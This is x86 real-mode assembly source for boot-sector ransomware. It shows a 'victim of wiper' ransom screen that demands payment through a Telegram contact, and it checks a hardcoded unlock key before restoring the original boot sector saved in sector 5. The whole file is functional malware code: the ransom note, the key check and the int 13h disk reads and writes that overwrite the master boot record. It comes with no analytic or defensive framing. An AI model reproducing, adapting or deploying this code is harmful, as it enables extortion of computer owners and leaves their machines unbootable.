;---------------------------------------------------

include IO.asm
include Utils.asm

.386						; Compile for a 80386 CPU
option segment:use16		; Force 16 bit segments instead of default 32 bit
.model tiny					; Tiny memory model
.code						; Start of code segment
org 07e00h					; Bootloader entry point

jmp start                   ; Jump to start
;---------------------------------------------------

start:
	call setColors
	mov si, offset start_of_header
	call puts
	mov si, offset header_text
	call puts
	mov si, offset end_of_header
	call puts
	mov si, offset content
	call puts

Loop:
	mov si, offset label_for_input
	call puts
	mov si, offset user_input
	call get_user_input
	mov bx, new_line
	call puts

	mov si, offset user_input
	mov bx, offset key

	call strcmp

	cmp ax, 1
	je error
	jne SectorCopy
	error:
		mov si, offset error_key
		call puts
		jmp Loop

SectorCopy:
	; Setup segments
    call setColors
	mov si, offset loader_message
	call puts
    xor ax, ax                  ; AX=0
    mov ds, ax                  ; DS=ES=0 because we use an org of 0x7c00 - Segment<<4+offset = 0x0000<<4+0x7c00 = 0x07c00
    mov es, ax
    mov ss, ax
    mov sp, 9000h               ; SS:SP= 0x0000:0x9000 stack in safe place

DiskRead:
    ;---read sector - 5th
    mov bx, buffer               ; ES: BX must point to the buffer
    mov dl, byte ptr [DISK]      ; use boot drive passed to bootloader by BIOS in DL
    mov dh, 0                    ; head number
    mov ch, 0                    ; track number
    mov cl, 05h                    ; sector number - (5th)
    mov al, 01h                    ; number of sectors to read
    mov ah, 02h                    ; read function number
    int 13h
	
	jc DiskRead
	
DiskWrite:
    ;---write sector - 1th
    mov bx, buffer               ; ES: BX must point to the buffer
	mov dl, byte ptr [DISK]      ; use boot drive passed to bootloader by BIOS in DL
    mov dh, 0                    ; head number
    mov ch, 0                    ; track number
    mov cl, 01h                    ; sector number - (1th)
    mov al, 01h                    ; number of sectors to write
    mov ah, 03h                    ; write function number
    int 13h
	
	jc DiskWrite
	
DiskCleanup:
	; Zero out the buffer
    mov bx, buffer              ; Point BX to the start of the buffer
    mov cx, 200h                ; 512 bytes per sector
    xor ax, ax                  ; Zero in AX
clear_buffer:
    mov word ptr [bx], ax       ; Write zero to buffer
    add bx, 02h                 ; Move BX to the next word (2 bytes)
    loop clear_buffer           ; Repeat for the entire buffer
	
	mov bx, buffer               ; Point BX to the start of the buffer
	mov dl, byte ptr [DISK]      ; use boot drive passed to bootloader by BIOS in DL
    mov dh, 0                    ; head number
    mov ch, 0                    ; track number
    mov cl, 05h                    ; sector number - (5th)
    mov al, 01h                    ; number of sectors to write
    mov ah, 03h                    ; write function number
    int 13h
	
	jc DiskCleanup

	int 19h                      ; Warm reboot, should run bootloader that was in sector 5 (original bootloader)


db 0
key db "must-try-a-bit-harder", 0
loader_message db "Loading Operating System...", 0Dh, 0Ah, 0
start_of_header db "=========================================================", 0Dh, 0Ah, 0
header_text db "          Oooops! You have been the victim of wiper!!!  ", 0Dh, 0Ah, 0
end_of_header db "=========================================================", 0Dh, 0Ah, 0
content db "   Y0UR DRIVE IS NOW DESTROYED AND Y0U CAN'T DO ANYTHING ! :]", 0Dh, 0Ah, "   GO And Get Your Decrypt Key From Here: ", 0Dh, 0Ah, 0Dh, 0Ah,"     TG: t.me/FastAndFurious", 0Dh,0Ah,0Dh,0Ah,"   Make Sure You Have At least 0.25 To Get Your Personal Files Back!",0Dh,0Ah,0Dh,0Ah,0
label_for_input db "  Key: ", 0
error_key db "  <== NOT VAILD KEY !",0Ah,0Dh, 0
user_input db 50 dup(0) 
new_line db 0Dh, 0Ah, 0
DISK db 80h
disknum db 99h
buffer equ 9200h

db 1024-($-start) dup(0)
end start